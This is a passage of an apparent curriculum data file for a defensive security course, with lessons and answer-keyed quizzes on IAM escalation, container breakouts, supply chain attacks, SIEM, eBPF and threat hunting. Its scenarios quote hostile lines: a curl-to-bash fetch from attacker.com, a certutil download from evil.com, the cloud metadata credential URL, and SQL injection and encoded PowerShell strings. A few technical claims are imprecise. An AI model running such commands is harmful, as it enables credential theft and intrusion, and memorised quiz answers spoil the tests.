    title: "⭐ MILESTONE 7: Zero-Trust Microsegmentation & SPIFFE/SPIRE Ephemeral mTLS Gateway",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Milestone Gate: Microsegmentation & Identity Mesh)",
    spokenGoal: "Assemble Milestone 7: Build a Zero-Trust Microsegmentation & mTLS Security Gateway uniting SPIFFE/SPIRE workload attestation, ephemeral X.509 certificate rotation, and application-level network policy enforcement.",
    conceptInvariant: "Cryptographic Identity Mesh Invariant: Zero-Trust microsegmentation requires that every packet on the wire is cryptographically authenticated and encrypted via mutual TLS, and authorized based on workload identity (SPIFFE ID), completely rendering network eavesdropping and IP spoofing impossible.",
    failureMode: "Deploying a service mesh with mTLS in 'permissive' mode instead of 'strict' mode, allowing an attacker to bypass certificate checks by initiating unencrypted plaintext connections directly to service ports.",
    tryItFriction: "Complete Milestone 7 by constructing a high-throughput proxy in TypeScript that enforces strict mTLS, verifies SPIFFE IDs against an authorization matrix, and exports Prometheus security metrics on dropped connections.",
    socraticHints: [
      "Why must mTLS be set to STRICT mode in production?",
      "Because PERMISSIVE mode accepts unauthenticated plaintext connections, defeating the entire purpose of mTLS!",
      "Enforce STRICT mode so any client without a valid, unexpired SPIFFE certificate is dropped at the TCP handshake."
    ],
    situationalPuzzle: {
      scenario: "During an architecture review, an engineer suggests: 'We can save CPU cycles by terminating mTLS at the edge ingress controller and letting internal microservices talk over unencrypted HTTP inside the cluster'. How do you respond as a Senior Security Architect?",
      options: [
        "Agree, because internal clusters are always 100% secure.",
        "Zero-Trust Architecture Defense: The perimeter is dead. If an attacker gains a foothold in any container (via RCE or dependency flaw), unencrypted internal traffic allows them to sniff database credentials, hijack sessions, and spoof internal calls. Strict internal mTLS with SPIFFE is mandatory for true defense-in-depth.",
        "Suggest switching to FTP.",
        "Agree, because CPUs cannot handle TLS encryption."
      ],
      answerIdx: 1,
      debrief: "Terminating TLS at the edge leaves the entire internal network vulnerable to lateral snooping, ARP spoofing, and rogue pods. Zero-Trust mandates end-to-end encryption and cryptographic identity directly to the pod level."
    },
    quests: [
      { id: "sec-m2-d40-q1", name: "Milestone 7 Architecture: Zero-Trust Microsegmentation Mesh", type: "concept", desc: "Design a multi-region service mesh enforcing strict mTLS, automated certificate rotation, and SPIFFE identity." },
      { id: "sec-m2-d40-q2", name: "Detective Lab: Auditing Service Mesh Configuration for Permissive Fallbacks", type: "detective", desc: "Scan mesh configuration files to identify any namespaces or routes where permissive mTLS is inadvertently allowed." },
      { id: "sec-m2-d40-q3", name: "Mastery Assignment: Full Zero-Trust SPIFFE mTLS Reverse Proxy Engine", type: "assignment", desc: "Build a production TypeScript gateway enforcing strict mTLS, SPIFFE identity extraction, and ABAC microsegmentation." },
      { id: "sec-m2-d40-q4", name: "Production Incident Lab: Rogue Container Containment via mTLS Denial", type: "detective", desc: "Demonstrate that an injected rogue container in a compromised pod is completely neutralized by mTLS connection rejection." }
    ]
  },

  // ─── BLOCK 9: Cloud Infrastructure & Supply Chain Security (Days 41–45) ────────
  {
    day: 41,
    month: 2,
    blockNum: 9,
    title: "Cloud IAM Privilege Escalation: AssumeRole Chaining, Permission Boundaries & IMDSv2",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Cloud Infrastructure & Identity Attack Graphs)",
    spokenGoal: "Deconstruct cloud security breaches: explore AWS/GCP IAM privilege escalation paths (PassRole, CreateAccessKey, AssumeRole chaining), implement IAM Permission Boundaries and Service Control Policies (SCPs), and mandate IMDSv2 to defeat metadata credential theft.",
    conceptInvariant: "Permission Boundary Ceiling Invariant: Granting `iam:CreateRole` or `iam:AttachRolePolicy` without an IAM Permission Boundary allows a developer or compromised service to create an Administrator role and grant it to themselves. A permission boundary acts as an immutable maximum ceiling that no child role can ever exceed.",
    failureMode: "Configuring EC2 instances with IMDSv1 enabled: an attacker finds a minor SSRF flaw in a PDF preview generator, fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, and extracts temporary AWS root access keys.",
    tryItFriction: "Audit an AWS IAM policy JSON in TypeScript: build an attack graph detector that identifies dangerous privilege escalation combinations (`iam:PassRole` + `ec2:RunInstances`) and validates that permission boundaries are strictly attached.",
    socraticHints: [
      "Why is `iam:PassRole` dangerous when combined with `ec2:RunInstances`?",
      "Because an attacker can launch an EC2 instance with the powerful Administrator role attached, and log into the instance to obtain full AWS admin privileges!",
      "Constrain `iam:PassRole` with an explicit resource ARN and enforce an IAM Permission Boundary."
    ],
    situationalPuzzle: {
      scenario: "A cloud security team enforces IMDSv2 on all EC2 instances (`HttpTokens: required`, `HttpPutResponseHopLimit: 1`). An attacker discovers an SSRF vulnerability in a backend Node.js microservice. The attacker sends a GET request to `http://169.254.169.254/latest/meta-data/`. The request returns `HTTP 401 Unauthorized`. Why did the SSRF fail to steal the credentials?",
      options: [
        "The EC2 instance had no internet access.",
        "IMDSv2 Session Token & Hop Limit Protection: IMDSv2 requires a `PUT` request with a special header (`X-aws-ec2-metadata-token-ttl-seconds`) to acquire a session token before metadata can be read. Simple GET-based SSRF exploits cannot generate this PUT request, and hop-limit=1 prevents container traversal.",
        "SSRF cannot access IP addresses.",
        "The attacker's IP address was blocked by AWS."
      ],
      answerIdx: 1,
      debrief: "IMDSv2 completely neutralizes classic SSRF attacks against cloud metadata by requiring a preliminary PUT request to obtain an ephemeral session token. Setting the hop limit to 1 also prevents containerized pods from stealing host instance credentials."
    },
    quests: [
      { id: "sec-m2-d41-q1", name: "Cloud IAM Attack Paths: 21 Escalation Methods Matrix", type: "concept", desc: "Detail AWS IAM escalation vectors including PassRole, UpdateAssumeRolePolicy, and GCP Service Account impersonation." },
      { id: "sec-m2-d41-q2", name: "Detective Lab: Tracing IAM Policy Graphs with CloudSploit / PMapper", type: "detective", desc: "Analyze an IAM policy graph to identify hidden escalation paths linking a low-privileged lambda role to full Administrator." },
      { id: "sec-m2-d41-q3", name: "Mastery Assignment: Automated IAM Least-Privilege & Boundary Linter", type: "assignment", desc: "Build a TypeScript tool parsing Terraform/CloudFormation IAM policies to detect wildcard (`*`) actions and missing boundaries." },
      { id: "sec-m2-d41-q4", name: "Production Incident Lab: Emergency IAM Key Compromise Quarantine", type: "detective", desc: "Execute automated containment on an active IAM credential leak: revoke sessions, apply denying SCPs, and rotate access keys." }
    ]
  },
  {
    day: 42,
    month: 2,
    blockNum: 9,
    title: "Container & Kubernetes Breakouts: Container Escape (SYS_ADMIN, hostPID) & Kubelet API",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Container Isolation & Linux Namespaces)",
    spokenGoal: "Break and defend container boundaries: analyze dangerous Kubernetes pod security flags (`privileged: true`, `hostPID: true`, `CAP_SYS_ADMIN`), execute container breakout techniques (mounting host cgroups, `nsenter` process injection), and enforce Pod Security Standards (PSS Restricted) via Kyverno.",
    conceptInvariant: "Container Isolation Invariant: A container is not a virtualization boundary; it is a regular Linux process constrained by namespaces and cgroups. Granting `privileged: true` or `hostPID: true` collapses process isolation, allowing a containerized process to access the host kernel, mount host filesystems, and take over the underlying node.",
    failureMode: "Running a monitoring pod with `privileged: true` and mounting `/var/run/docker.sock`: an attacker compromises the web application in that pod, communicates directly with the Docker daemon, launches a container with root host mounts, and owns the entire Kubernetes node.",
    tryItFriction: "Analyze a vulnerable Kubernetes Pod manifest: identify the 3 container breakout vectors (`hostPath: /`, `privileged: true`, `hostNetwork: true`), and rewrite it into a hardened PSS Restricted pod specification.",
    socraticHints: [
      "Why is mounting `/var/run/docker.sock` inside a container equivalent to giving root on the host?",
      "Because the Docker socket lets the container instruct the host daemon to spawn a new container with the root filesystem (`/`) mounted as a volume!",
      "Never mount the Docker/containerd socket into pods; use isolated rootless container builders (Kaniko/BuildKit)."
    ],
    situationalPuzzle: {
      scenario: "An attacker exploits an RCE vulnerability inside an unprivileged Kubernetes pod. They run `cat /var/run/secrets/kubernetes.io/serviceaccount/token` and obtain a service account JWT. They use `curl` to query the Kubelet API (`https://kubernetes.default.svc/api/v1/pods`). The API responds with `HTTP 403 Forbidden`. What Kubernetes security mechanism blocked the cluster takeover?",
      options: [
        "Kubernetes disabled the curl command.",
        "Kubernetes RBAC Least Privilege: The service account mounted into the pod had zero cluster permissions (Role / ClusterRole), adhering to least privilege. Possessing the token provided no authorization to list pods, read secrets, or execute commands in other pods.",
        "The Kubelet API is only accessible from Windows nodes.",
        "The cluster was running in demo mode."
      ],
      answerIdx: 1,
      debrief: "Default service accounts in Kubernetes should have `automountServiceAccountToken: false` set unless explicitly needed. When mounted, RBAC policies must ensure the service account has zero permissions beyond its narrow role, preventing cluster takeover."
    },
    quests: [
      { id: "sec-m2-d42-q1", name: "Linux Namespaces vs cgroups v2 vs Seccomp Profiles", type: "concept", desc: "Detail PID, Mount, Net, IPC, UTS namespaces, and how seccomp filters block dangerous kernel syscalls." },
      { id: "sec-m2-d42-q2", name: "Detective Lab: Dissecting Container Breakouts via hostPath & cgroups", type: "detective", desc: "Trace an exploit path demonstrating how a privileged container escapes to the host via cgroup release_agent." },
      { id: "sec-m2-d42-q3", name: "Mastery Assignment: Kubernetes Pod Security Standards Admission Enforcer", type: "assignment", desc: "Implement a TypeScript validating webhook rejecting pods with root UIDs, host namespaces, or dangerous capabilities." },
      { id: "sec-m2-d42-q4", name: "Production Incident Lab: Triage of Compromised Cluster Node Escape", type: "detective", desc: "Isolate and drain a compromised Kubernetes worker node after an adversary escaped an unhardened container." }
    ]
  },
  {
    day: 43,
    month: 2,
    blockNum: 9,
    title: "Software Supply Chain Security: Dependency Confusion, Typosquatting & SLSA Level 4",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Supply Chain Integrity & Hermetic Builds)",
    spokenGoal: "Secure the software supply chain: analyze real-world dependency attacks including Typosquatting, Dependency Confusion, and malicious install scripts (`preinstall`), generate Software Bills of Materials (SBOM via CycloneDX / SPDX), and implement Supply-chain Levels for Software Artifacts (SLSA).",
    conceptInvariant: "Provenance Integrity Invariant: A software artifact cannot be trusted merely because it exists in an artifact repository. Trust requires cryptographic proof of provenance (SLSA): an immutable, verifiable attestation detailing the exact source repository, commit hash, build environment, and build recipe that created the binary.",
    failureMode: "An internal corporate package `@acme/billing` is published only to a private registry. An attacker registers the identical name `acme-billing` on public npm with version `99.0.0`: the build server's package manager defaults to public registries for higher versions and downloads the attacker's malware.",
    tryItFriction: "Audit a `package-lock.json` file in TypeScript: detect unpinned dependencies, flag dependencies that execute preinstall/postinstall hooks, and verify package integrity hashes against a tamper-evident SBOM.",
    socraticHints: [
      "How does Dependency Confusion work?",
      "Package managers like npm or pip often prioritize public registries or higher version numbers over internal private registries!",
      "Scope internal packages with an organization prefix (`@myorg/`) and configure package managers to never search public registries for scoped packages."
    ],
    situationalPuzzle: {
      scenario: "A developer installs a popular logging library from npm. During `npm install`, a malicious `postinstall` script in the package executes `curl -s attacker.com/malware.sh | bash` and steals the developer's SSH keys and `.env` files. What security configuration would have completely neutralized this attack?",
      options: [
        "Running npm with `sudo`.",
        "Disabling Package Lifecycle Scripts: Configuring `npm config set ignore-scripts true` prevents packages from executing arbitrary shell commands during installation. Furthermore, package scanning tools (Socket.dev) detect install scripts before dependencies are resolved.",
        "Renaming the package file to .txt.",
        "Using HTTP instead of HTTPS for npm downloads."
      ],
      answerIdx: 1,
      debrief: "Package lifecycle scripts (`preinstall`, `postinstall`) are the #1 attack vector in npm/PyPI supply chain attacks. Running builds with `--ignore-scripts` prevents untrusted code execution during dependency resolution."
    },
    quests: [
      { id: "sec-m2-d43-q1", name: "SLSA Framework Levels 1–4 & Supply Chain Attack Vectors", type: "concept", desc: "Detail SLSA requirements for build automation, version control, hermetic environments, and two-party reviews." },
      { id: "sec-m2-d43-q2", name: "Detective Lab: Deobfuscating Malicious npm Postinstall Payloads", type: "detective", desc: "Reverse-engineer a malicious package payload disguised with base64 encoding and process environment exfiltration." },
      { id: "sec-m2-d43-q3", name: "Mastery Assignment: Automated CycloneDX SBOM Generator & Vulnerability Scanner", type: "assignment", desc: "Build a TypeScript tool generating CycloneDX 1.5 JSON SBOMs and cross-referencing package hashes against OSV databases." },
      { id: "sec-m2-d43-q4", name: "Production Incident Lab: Triage of Malicious Upstream Dependency Injection", type: "detective", desc: "Isolate a build system compromised by a hijacked upstream open-source library and revoke all exposed CI secrets." }
    ]
  },
  {
    day: 44,
    month: 2,
    blockNum: 9,
    title: "Cryptographic Artifact Signing: Sigstore Cosign, Rekor Transparency Log & in-toto",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Keyless Signing & Transparency Logs)",
    spokenGoal: "Deploy modern cryptographic artifact verification with the Linux Foundation's Sigstore: understand keyless signing via OpenID Connect and Fulcio ephemeral certificates, verify signatures against the Rekor public transparency log, and generate in-toto attestations for container images.",
    conceptInvariant: "Transparency-Log-Backed Signing Invariant: Static private signing keys are liability magnets (they leak or get stolen). Sigstore Keyless Signing binds artifact signatures to short-lived (10-minute) X.509 certificates issued via OIDC identity tokens, and records every signature in Rekor—an immutable, append-only cryptographic Merkle transparency log.",
    failureMode: "Deploying container images to production Kubernetes clusters based purely on image tags (`myapp:latest`) without cryptographic signature verification, allowing a compromised container registry to serve backdoored images.",
    tryItFriction: "Sign a container image using `cosign`: inspect the generated signature payload, query the Rekor transparency log for the inclusion proof, and write an admission verification script that rejects unsigned container images.",
    socraticHints: [
      "Why is Sigstore called 'keyless' signing if cryptographic signatures are still generated?",
      "Because developers don't manage or store long-term private keys! Fulcio issues a temporary certificate tied to the developer's OIDC identity that expires in minutes.",
      "The signature is recorded in Rekor, so verifiers can confirm the signature was valid at the exact time of signing."
    ],
    situationalPuzzle: {
      scenario: "An enterprise Kubernetes cluster runs an image signed with Cosign. An attacker gains write access to the enterprise container registry and replaces the image binary with a backdoored container while keeping the exact same tag (`v1.4.2`). When the deployment reconciles, Kubernetes refuses to pull the image with an admission error. Why?",
      options: [
        "The container registry was out of disk space.",
        "Cosign Signature Digest Mismatch: Cosign signatures are bound to the cryptographic SHA-256 digest of the image manifest, not the mutable tag. When the attacker altered the image binary, its digest changed, causing the cryptographic signature verification to fail.",
        "Docker tags are read-only.",
        "The cluster was offline."
      ],
      answerIdx: 1,
      debrief: "Container tags (like `latest` or `v1.4.2`) are mutable pointers. Signatures in Sigstore Cosign are cryptographically calculated over the immutable SHA-256 content digest. Any alteration of the container bytes immediately invalidates the signature."
    },
    quests: [
      { id: "sec-m2-d44-q1", name: "Sigstore Ecosystem Architecture: Cosign, Fulcio, and Rekor", type: "concept", desc: "Detail OIDC identity token exchange, Fulcio ephemeral CA issuance, and Rekor Merkle tree inclusion proofs." },
      { id: "sec-m2-d44-q2", name: "Detective Lab: Auditing in-toto Attestations for CI/CD Pipeline Steps", type: "detective", desc: "Verify in-toto cryptographic provenance attestations linking source git commit to compiled binary container." },
      { id: "sec-m2-d44-q3", name: "Mastery Assignment: Kubernetes Cosign Admission Controller Verifier", type: "assignment", desc: "Implement a TypeScript admission controller validating Cosign signatures and Rekor transparency proofs before pod creation." },
      { id: "sec-m2-d44-q4", name: "Production Incident Lab: Registry Image Tampering Detection & Immediate Halt", type: "detective", desc: "Detect and halt an automated production deployment after an unsigned, tampered container image was pushed to the registry." }
    ]
  },
  {
    day: 45,
    month: 2,
    blockNum: 9,
    title: "⭐ MILESTONE 8: Hermetic Supply Chain & Cosign / Rekor Admission Controller Enforcer",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Milestone Gate: Cryptographic Supply Chain Gate)",
    spokenGoal: "Assemble Milestone 8: Build an end-to-end Hermetic Supply Chain & Admission Control Pipeline uniting SLSA Level 3 provenance generation, automated dependency vulnerability blocking, Sigstore Cosign keyless image signing, and Kubernetes admission enforcement.",
    conceptInvariant: "Binary Provenance Enclave Invariant: No container or binary can ever enter production unless: (1) it was compiled in a hermetic, isolated CI runner, (2) its dependencies match an approved, scanned SBOM, (3) it possesses an in-toto provenance attestation, and (4) its digest is cryptographically signed and logged in Rekor.",
    failureMode: "Allowing developers to build container images on their local laptops and push directly to production registries, introducing unvetted local binaries, malware, and uncommitted code into the enterprise production fleet.",
    tryItFriction: "Complete Milestone 8 by constructing an automated CI/CD security gate that compiles an artifact, generates a CycloneDX SBOM, signs the image with Cosign, and verifies it with a custom admission webhook.",
    socraticHints: [
      "Why must local laptop builds be banned from production?",
      "Because local machines lack hermetic guarantees and can be infected with malware or contain unreviewed code changes!",
      "Enforce that only automated CI pipelines with OIDC tokens can sign container images with production authority."
    ],
    situationalPuzzle: {
      scenario: "During an audit, a security architect discovers that a developer bypassed the CI/CD pipeline by directly using `kubectl apply` with an unsigned image. The cluster rejected the pod with `AdmissionWebhook Denied: Missing valid Cosign signature`. How did the architecture prevent the unauthorized deployment?",
      options: [
        "Kubernetes crashed.",
        "Admission Controller Zero-Trust Enforcement: The cluster ran a validating admission webhook (Kyverno / OPA Gatekeeper / custom Cosign enforcer) that intercepts all pod creation requests at the API server level and rejects any image lacking a verified cryptographic signature.",
        "The developer's keyboard was locked.",
        "The image file was too large."
      ],
      answerIdx: 1,
      debrief: "A hardened Kubernetes cluster uses admission controllers to enforce security invariants at the API boundary. Even an administrator with `kubectl` cannot run an unsigned image if the admission webhook enforces signature validation."
    },
    quests: [
      { id: "sec-m2-d45-q1", name: "Milestone 8 Architecture: Hermetic DevSecOps Pipeline", type: "concept", desc: "Design an automated supply chain architecture from source git commit to signed artifact deployment." },
      { id: "sec-m2-d45-q2", name: "Detective Lab: Auditing Unsigned Artifact Infiltration into Production Clusters", type: "detective", desc: "Scan a running cluster to verify that 100% of running container images match signed digests in the transparency log." },
      { id: "sec-m2-d45-q3", name: "Mastery Assignment: Production Kubernetes Cosign Image Admission Webhook", type: "assignment", desc: "Build a TypeScript admission webhook verifying Sigstore Cosign signatures and Rekor inclusion proofs for K8s pods." },
      { id: "sec-m2-d45-q4", name: "Production Incident Lab: Triage of Supply Chain Tamper Alert in Production Fleet", type: "detective", desc: "Respond to a high-severity alert indicating an attempt to run an unsigned, tampered container in the payment namespace." }
    ]
  },

  // ─── BLOCK 10: SIEM, Detection Engineering & Threat Hunting (Days 46–50) ────────
  {
    day: 46,
    month: 2,
    blockNum: 10,
    title: "Security Information & Event Management (SIEM): Ingestion, Sigma Rules & Correlation",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Security Telemetry & Detection Engineering)",
    spokenGoal: "Engineer enterprise threat detection: construct high-throughput log ingestion pipelines using Elastic/Splunk/OpenSearch, author standardized Sigma detection rules, and correlate multi-stage events across firewall logs, authentication records, and cloud audit trails.",
    conceptInvariant: "Correlation Window Invariant: Advanced persistent threats execute individual actions that appear benign in isolation (e.g., single failed login, occasional DNS lookup). A true SIEM detection rule matches sequences of disparate events occurring across a defined time window (e.g., 5 failed logins within 60 seconds followed by a successful login from a new IP and an immediate privilege escalation API call).",
    failureMode: "Alerting on every individual failed login independently without correlation, burying the Security Operations Center (SOC) under 50,000 alert notifications per day (alert fatigue) and causing analysts to miss the actual account takeover.",
    tryItFriction: "Write a Sigma detection rule in YAML that detects password spraying across multiple user accounts from a single IP address, and compile it into an executable Elasticsearch query using `sigmac`.",
    socraticHints: [
      "What is alert fatigue in a SOC?",
      "When security analysts receive so many low-value alerts that they begin ignoring notifications, allowing real attackers to slip through unnoticed!",
      "Group events by IP or entity over a sliding time window and alert only when high-confidence correlation thresholds are breached."
    ],
    situationalPuzzle: {
      scenario: "A SOC analyst receives an alert for 'Possible SQL Injection'. The raw log shows a user submitted `test' OR 1=1 --` into a search field. The server responded with `HTTP 200 OK` and 50 KB of JSON data. How does the analyst determine if the attack succeeded or failed?",
      options: [
        "Assume it succeeded because the HTTP status code was 200.",
        "Response Content & Database Query Correlation: An HTTP 200 alone does not prove success; many web apps return 200 with an empty array or an error message. The analyst must correlate the web log with the backend database query logs and verify whether unauthorized rows were actually returned or if a prepared statement safely handled the input as a string.",
        "Ask the user if they were trying to hack the site.",
        "Close the alert because SQL injection is impossible on search fields."
      ],
      answerIdx: 1,
      debrief: "True detection engineering correlates ingress HTTP requests with backend execution outcomes. Attackers probe with injection payloads constantly; triage requires confirming whether the backend database executed the query as syntax or safely treated it as a literal string."
    },
    quests: [
      { id: "sec-m2-d46-q1", name: "SIEM Architecture: Ingestion, Normalization (ECS/OCSF) & Indexing", type: "concept", desc: "Detail Elastic Common Schema (ECS), Open Cybersecurity Schema Framework (OCSF), and log pipeline scaling." },
      { id: "sec-m2-d46-q2", name: "Detective Lab: Authoring Generic Sigma Rules for Privilege Escalation", type: "detective", desc: "Write Sigma rules detecting suspicious process creation (whoami, net user, curl) spawned by web server processes." },
      { id: "sec-m2-d46-q3", name: "Mastery Assignment: Production Log Correlation Engine in TypeScript", type: "assignment", desc: "Build a TypeScript streaming correlation engine that parses log streams and triggers high-severity alerts on multi-step attack patterns." },
      { id: "sec-m2-d46-q4", name: "Production Incident Lab: Triage of Live APT Infiltration Alert in SIEM Console", type: "detective", desc: "Correlate disparate log sources during an active red-team breach to track an adversary moving through the network." }
    ]
  },
  {
    day: 47,
    month: 2,
    blockNum: 10,
    title: "Endpoint Detection & Response (EDR): Linux eBPF Kernel Tracing & Process Trees",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Kernel Telemetry & eBPF Security Observability)",
    spokenGoal: "Achieve deep OS visibility using extended Berkeley Packet Filter (eBPF): deploy kernel tracepoints with Tetragon and Tracee, inspect system calls (`execve`, `connect`, `openat`), trace parent-child process tree lineage, and detect anomalous execution in real-time.",
    conceptInvariant: "Kernel Tracing Immutability Invariant: User-space monitoring agents (like LD_PRELOAD or syslog) can be bypassed or blinded by an attacker with local root permissions. eBPF operates safely within the Linux kernel, hooking directly into kernel syscall entry/exit points, providing unbypassable, tamper-proof process execution telemetry.",
    failureMode: "Relying on bash history (`.bash_history`) or auditd user-space logs for endpoint monitoring: an attacker runs `unset HISTFILE` or kills auditd, blinding security visibility while they execute reconnaissance scripts.",
    tryItFriction: "Write an eBPF tracepoint program in C / Rust that hooks the `sys_enter_execve` syscall, extracts the binary path and argument vector, and alerts whenever an interactive shell (`/bin/sh`, `/bin/bash`) is spawned by a web server UID.",
    socraticHints: [
      "Why is a web server process spawning `/bin/sh` an immediate critical indicator of compromise?",
      "Because web servers (Node, Nginx, Python) should never launch interactive shell prompts; it almost always indicates a Remote Code Execution (RCE) exploit!",
      "Hook `execve` via eBPF: if `parent_process == 'node'` and `child_process == 'sh'`, block or alert immediately."
    ],
    situationalPuzzle: {
      scenario: "An attacker exploits a zero-day in a container and executes a reverse shell. To evade process monitoring tools (`ps`, `top`), the attacker replaces the `/bin/ps` binary and modifies `/proc`. However, the eBPF security sensor (Tetragon) instantly fires a critical alert detailing the exact reverse shell command and destination IP. Why couldn't the attacker hide from eBPF?",
      options: [
        "The attacker forgot to turn off the monitor.",
        "Kernel-Level Tracepoint Authority: eBPF runs in kernel space and hooks into internal kernel schedulers and socket structures directly. Tampering with user-space binaries (`ps`) or filesystem virtual interfaces (`/proc`) has zero effect on kernel-level tracepoint emission.",
        "eBPF uses artificial intelligence to read the attacker's thoughts.",
        "The container automatically rebooted."
      ],
      answerIdx: 1,
      debrief: "eBPF operates inside the Linux kernel. Even if an attacker tampers with all user-space utilities and rootkits the filesystem, the kernel must still execute `execve()` and `tcp_v4_connect()`, which eBPF captures directly with zero user-space dependence."
    },
    quests: [
      { id: "sec-m2-d47-q1", name: "eBPF Architecture: Kprobes, Tracepoints & Ring Buffers", type: "concept", desc: "Detail BPF verifier constraints, kernel helper functions, and high-performance ring buffer streaming to user space." },
      { id: "sec-m2-d47-q2", name: "Detective Lab: Tracing Reverse Shells via Tetragon / Tracee eBPF Events", type: "detective", desc: "Inspect real-time eBPF JSON events capturing binary path, arguments, process lineage, and socket connections." },
      { id: "sec-m2-d47-q3", name: "Mastery Assignment: eBPF-Powered Real-Time Process Anomaly Sensor", type: "assignment", desc: "Build a TypeScript telemetry consumer that ingests eBPF events and flags unauthorized child processes spawned by services." },
      { id: "sec-m2-d47-q4", name: "Production Incident Lab: Detection of Fileless In-Memory Malware via eBPF", type: "detective", desc: "Detect and isolate a fileless memory-only binary execution (`memfd_create`) running on a production worker node." }
    ]
  },
  {
    day: 48,
    month: 2,
    blockNum: 10,
    title: "Threat Hunting with MITRE ATT&CK: TTPs & Living-off-the-Land (LotL) Detection",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Behavioral Threat Hunting & Enterprise TTPs)",
    spokenGoal: "Hunt advanced adversaries across enterprise networks: map attacks to the MITRE ATT&CK framework (Reconnaissance, Initial Access, Lateral Movement, Exfiltration), identify Living-off-the-Land (LotL) binaries (LOLBAS / GTFOBins: `certutil`, `powershell`, `curl`), and build proactive hypothesis-driven threat hunts.",
    conceptInvariant: "Behavioral TTP Invariant: Hash-based IoCs (file hashes, known IP addresses) expire within hours as attackers recompile code and rotate infrastructure. Threat hunting must focus on Tactics, Techniques, and Procedures (TTPs) and behavioral anomalies (e.g. `powershell.exe -enc` or `certutil -urlcache`) which attackers cannot easily change.",
    failureMode: "Relying purely on antivirus file hashes: an attacker uses built-in administrative tools (`certutil -urlcache -split -f http://evil.com/payload.exe`) to download and execute ransomware without dropping a single known signature.",
    tryItFriction: "Analyze Windows Event Logs (Event ID 4688: Process Creation) and Linux audit logs to identify Living-off-the-Land command lines that download remote scripts or dump memory.",
    socraticHints: [
      "What is 'Living off the Land' (LotL)?",
      "Using legitimate, pre-installed operating system administration tools (`certutil`, `curl`, `wmic`, `powershell`) to execute attacks without dropping external malware!",
      "Hunt for abnormal arguments: `certutil` being invoked to fetch external HTTP URLs rather than manage certificates."
    ],
    situationalPuzzle: {
      scenario: "A threat hunter investigates an endpoint where an attacker ran `powershell -nop -w hidden -encodedcommand VwByAGkAdABlAC0ASABvAHMAdAA...`. The command was obfuscated with Base64. What is the hunter's first operational step, and what ATT&CK technique was used?",
      options: [
        "Reboot the computer immediately.",
        "ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell) & T1027 (Obfuscated/Encoded Files): Decode the UTF-16LE Base64 string to inspect the underlying script, identify whether ScriptBlock Logging (Event ID 4104) captured the deobfuscated code, and trace child processes.",
        "Delete PowerShell from the operating system.",
        "Change the user's password."
      ],
      answerIdx: 1,
      debrief: "Adversaries use encoded PowerShell commands to evade simple string command-line logging. Threat hunters decode the UTF-16LE string and leverage PowerShell ScriptBlock Logging (Event 4104), which logs the script after deobfuscation immediately before execution."
    },
    quests: [
      { id: "sec-m2-d48-q1", name: "MITRE ATT&CK Matrix Navigation & Pyramid of Pain", type: "concept", desc: "Analyze the 14 enterprise tactics, 196+ techniques, and why TTPs occupy the top of David Bianco's Pyramid of Pain." },
      { id: "sec-m2-d48-q2", name: "Detective Lab: Hunting Living-off-the-Land Binaries (GTFOBins / LOLBAS)", type: "detective", desc: "Construct hunting queries detecting abusive invocations of certutil, mshta, curl, python, and netsh." },
      { id: "sec-m2-d48-q3", name: "Mastery Assignment: Automated Threat Hunting Hypothesis Engine", type: "assignment", desc: "Build a TypeScript hunting automation tool that runs scheduled behavioral queries against telemetry datastores." },
      { id: "sec-m2-d48-q4", name: "Production Incident Lab: Active Adversary Lateral Movement Hunt", type: "detective", desc: "Hunt down and map the complete footprint of an advanced threat actor executing pass-the-hash across internal systems." }
    ]
  },
  {
    day: 49,
    month: 2,
    blockNum: 10,
    title: "Automated Incident Response (SOAR): Webhook Ingestion, Quarantine & Memory Snapshots",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Security Orchestration, Automation & Response)",
    spokenGoal: "Reduce Mean Time to Remediate (MTTR) from hours to milliseconds: build Security Orchestration, Automation, and Response (SOAR) playbooks that automatically ingest high-confidence security alerts, trigger forensic memory dumps (LiME), isolate compromised hosts from the network, and rotate credentials.",
    conceptInvariant: "Automated Containment Invariant: Human analysts cannot respond fast enough to stop automated ransomware propagating across internal networks at thousands of hosts per minute. High-confidence alerts (e.g. known ransomware canary tripwire) must trigger automated network isolation playbooks within milliseconds without waiting for human approval.",
    failureMode: "Requiring manual ticket creation and manager approval before a compromised host can be disconnected from the network, allowing ransomware to encrypt 500 enterprise database servers while the on-call engineer sleeps.",
    tryItFriction: "Build a SOAR incident response playbook in TypeScript that listens for an EDR alert webhook, automatically modifies AWS Security Groups to isolate the instance, issues a memory snapshot command, and posts a triage summary to Slack.",
    socraticHints: [
      "What is network isolation in automated incident response?",
      "Replacing the host's security group or firewall rules with an isolation rule that drops all traffic EXCEPT a dedicated forensics SSH connection!",
      "Capture volatile memory first (via snapshot) before terminating or rebooting the machine to preserve forensic evidence."
    ],
    situationalPuzzle: {
      scenario: "A junior analyst investigates a server infected with active malware and immediately runs `reboot` to 'clear the attacker'. Why is rebooting an active breach host considered an unforgivable forensic mistake?",
      options: [
        "Rebooting damages the CPU hardware.",
        "Destruction of Volatile Evidence: Rebooting wipes the system's RAM. Volatile memory contains the active injected malware payload, running network socket connections, decrypted encryption keys, and active process states that can never be recovered once the machine is power-cycled.",
        "The computer will refuse to turn back on.",
        "Operating systems cannot be rebooted while malware is running."
      ],
      answerIdx: 1,
      debrief: "Volatile evidence in RAM (order of volatility: RFC 3227) is irreplaceable. Investigators must acquire a memory dump (`dd /dev/fmem`, LiME, or VM snapshot) while the system is running to extract keys, memory-only payloads, and unencrypted command histories before taking any destructive containment action."
    },
    quests: [
